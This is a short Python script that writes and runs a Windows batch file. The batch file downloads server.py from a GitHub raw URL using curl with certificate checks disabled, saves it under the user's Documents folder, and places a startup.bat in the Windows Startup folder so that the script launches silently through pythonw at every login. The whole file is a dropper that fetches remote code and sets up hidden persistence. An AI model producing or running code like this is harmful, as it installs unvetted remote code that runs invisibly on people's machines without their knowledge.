with open('executer.bat', 'w') as f:
    f.write("@echo off\n")
    f.write("cd %userprofile%\\Documents\\\n")
    f.write("md serverstuff\n")
    f.write("cd serverstuff\n")
    f.write("curl --insecure https://raw.githubusercontent.com/misterjones69420/project-yes/main/server.py -o server.py\n")
    f.write("cd %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n")
    f.write("echo @echo off > startup.bat\n")
    f.write("echo cd %userprofile%\\Documents\\serverstuff\\ >> startup.bat\n")
    f.write("echo start pythonw server.py >> startup.bat\n")
    f.write("startup.bat")
import subprocess
subprocess.run(['executer.bat'])